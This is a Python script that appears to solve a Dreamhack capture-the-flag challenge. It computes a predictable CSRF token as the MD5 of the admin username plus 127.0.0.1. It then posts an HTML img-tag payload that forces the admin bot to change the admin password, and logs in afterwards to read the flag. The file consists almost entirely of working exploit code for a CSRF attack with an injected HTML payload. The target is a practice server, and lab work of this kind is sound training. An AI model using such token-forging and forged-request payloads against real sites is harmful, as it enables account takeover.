import requests
from hashlib import md5

## Create Token
username = b"admin"
ip = b"127.0.0.1"

#token_storage_session_id_admin = md5(("admin" + "127.0.0.1").encode()).hexdigest()
token_storage_session_id_admin = md5(username+ip).hexdigest()
print(token_storage_session_id_admin) #7505b9c72ab4aa94b1a4ed7b207b67fb
payload=f'<img src="/change_password?pw=admin&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">'
print(payload)
#ddiaj chir và data noiw chúng ta có thể tấn ccong

host=f"http://host3.dreamhack.games:9420/flag"
data={ "param":f"{payload}" }
print(host)
try:
    res=requests.post(host,data=data)
    print("request complete")
    print(res.text)
    try:
        data = {"username":"admin", "password":"admin"}
        response = requests.post("http://host3.dreamhack.games:9420/login",data=data)
        if "DH{" in response.text:
            print(response.text)
        else:   
            print("login failed")
    except Exception as e:
        print(e)
except Exception as e:
    print(e)



# ## Change the password of admin
# change = "\"/change_password?pw={}&csrftoken={}\"".format("admin",csrf_token)
# data = {"param": '<img src={}>'.format(change)}



